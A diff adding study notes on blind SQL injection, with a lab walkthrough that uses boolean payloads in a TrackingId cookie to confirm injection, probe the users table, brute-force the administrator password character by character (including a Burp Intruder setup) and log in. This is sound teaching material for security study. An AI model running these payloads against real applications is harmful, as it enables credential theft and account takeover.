@@ -308,3 +308,165 @@ This might return the following output. In this case, you can confirm that the d
 >Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 X64
 
 ---
+## Blind SQL Injection
+
+Blind SQL Injection is a web security vulnerability where an attacker injects malicious SQL payloads and infers database contents by observing **differences in application behavior** — such as the presence/absence of page content, response time delays, or HTTP status codes — rather than viewing query results directly. The application never returns raw SQL output in the response.
+Two sub-types exist:
+
+- **Boolean-based**: True/false conditions cause visible page differences (e.g., a "Welcome back" message appears or disappears)
+- **Time-based**: True/false conditions cause measurable time delays (e.g., `SLEEP(5)`)
+---
+### Exploitation Workflow (Lab Scenario)
+
+**Scenario:** An e-commerce site uses a `TrackingId` cookie for analytics. The backend executes:
+
+```sql
+SELECT * FROM tracking WHERE id = '[cookie-value]'
+```
+
+The query results are never displayed. No error messages are shown. The only observable difference is that if the query returns any rows, the page includes **"Welcome back"**; if zero rows, the message is absent. A separate table `users` exists with columns `username` and `password`.
+
+---
+
+### Step 1: Confirm the Injection Point
+
+Force true and false states to verify the parameter is injectable.
+
+```sql
+TrackingId=xyz' AND '1'='1'-- 
+```
+
+- Full query: `SELECT * FROM tracking WHERE id = 'xyz' AND '1'='1'`
+- Condition is **TRUE** → query returns rows → **"Welcome back" appears**
+
+```sql
+TrackingId=xyz' AND '1'='2'-- 
+```
+
+- Full query: `SELECT * FROM tracking WHERE id = 'xyz' AND '1'='2'`
+- Condition is **FALSE** → query returns zero rows → **"Welcome back" absent**
+
+**Inference:** The cookie is injectable. The presence/absence of "Welcome back" serves as the boolean oracle.
+
+---
+
+### Step 2: Confirm the Target Schema Exists
+
+Use the oracle to ask yes/no questions about the database structure.
+
+```sql
+TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a'-- 
+```
+
+- Subquery selects `'a'` from the `users` table. If the table exists, it returns `'a'` → `'a'='a'` is **TRUE**
+- **"Welcome back" appears** → confirms `users` table exists
+
+```sql
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a'-- 
+```
+
+- Subquery selects `'a'` where `username='administrator'`. If that user exists, returns `'a'` → condition is **TRUE**
+- **"Welcome back" appears** → confirms `administrator` user exists
+
+---
+
+### Step 3: Determine Password Length
+
+Increment a length check until the condition fails.
+
+```sql
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'-- 
+...
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a'-- 
+```
+
+When `>20` returns no message, the password is **exactly 20 characters** long.
+
+---
+
+### Step 4: Extract the Password Character-by-Character
+
+Use `SUBSTRING()` inside a subquery to isolate a single character position and brute-force its value against the oracle.
+
+**Payload:**
+
+```sql
+TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'-- 
+```
+
+**Dissection:**
+
+|Segment|Role|
+|:--|:--|
+|`xyz'`|Closes the original string literal in the query|
+|`AND`|Appends a second boolean condition to the `WHERE` clause|
+|`(SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')`|**Subquery**: queries the `users` table, filters to the `administrator` row, and uses `SUBSTRING(password,1,1)` to extract exactly **1 character starting at position 1** from the `password` column|
+|`='a'`|Compares that extracted single character against the candidate value `'a'`|
+|`--`|Comments out any remaining trailing SQL syntax to prevent errors|
+
+**How `SUBSTRING(password,1,1)` functions in this context:**
+
+- The 1st argument `password` is the column being sliced
+- The 2nd argument `1` tells the database to start at the **first character** of that password string
+- The 3rd argument `1` tells it to extract only **one character** in length
+- Result: if the password is `p4ssw0rd...`, this returns `'p'` for position 1
+
+To test the second character, the payload becomes:
+
+```sql
+... SUBSTRING(password,2,1) ...='a'-- 
+```
+
+Here `SUBSTRING(password,2,1)` starts at position 2 and extracts 1 character. If the password is `p4ssw0rd...`, this returns `'4'`.
+
+**The brute-force process:**
+
+- `SUBSTRING(password,1,1)='a'` → no message → not 'a'
+- `SUBSTRING(password,1,1)='b'` → no message → not 'b'
+- `SUBSTRING(password,1,1)='p'` → **"Welcome back"** → 1st character is `'p'`
+
+Repeat for positions 1 through 20, testing characters `a-z` and `0-9` at each position.
+
+**Automation with Burp Intruder:**
+
+```sql
+TrackingId=xyz' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§'-- 
+```
+
+|Payload Set|Values|Purpose|
+|:--|:--|:--|
+|Position marker|`1` through `20`|Which password character to test|
+|Character marker|`a-z`, `0-9`|Candidate value to compare against|
+
+**Total requests:** 20 positions × 36 characters = **720 requests**
+
+---
+
+### Step 5: Interpret the Oracle and Reconstruct the Password
+
+|Subquery Result|Condition|Query Returns|Page Behavior|Meaning|
+|:--|:--|:--|:--|:--|
+|Character matches|`='a'` is TRUE|Rows|"Welcome back" visible|That character at that position is correct|
+|Character differs|`='a'` is FALSE|Zero rows|No message|That character is incorrect|
+
+After Intruder completes, collect every character that produced a "Welcome back" match for each of the 20 positions. Concatenate them to form the full password.
+
+---
+
+### Step 6: Log In as Administrator
+
+Navigate to **My account**, enter:
+
+- **Username:** `administrator`
+- **Password:** `[the 20-character string extracted via SUBSTRING brute-forcing]`
+
+---
+
+### Database-Specific SUBSTRING Syntax
+
+| Database             | Function                   | Example                   |
+| :------------------- | :------------------------- | :------------------------ |
+| MySQL                | `SUBSTRING()` / `SUBSTR()` | `SUBSTRING(password,1,1)` |
+| PostgreSQL           | `SUBSTRING()` / `SUBSTR()` | `SUBSTRING(password,1,1)` |
+| Microsoft SQL Server | `SUBSTRING()`              | `SUBSTRING(password,1,1)` |
+| Oracle               | `SUBSTR()`                 | `SUBSTR(password,1,1)`    |
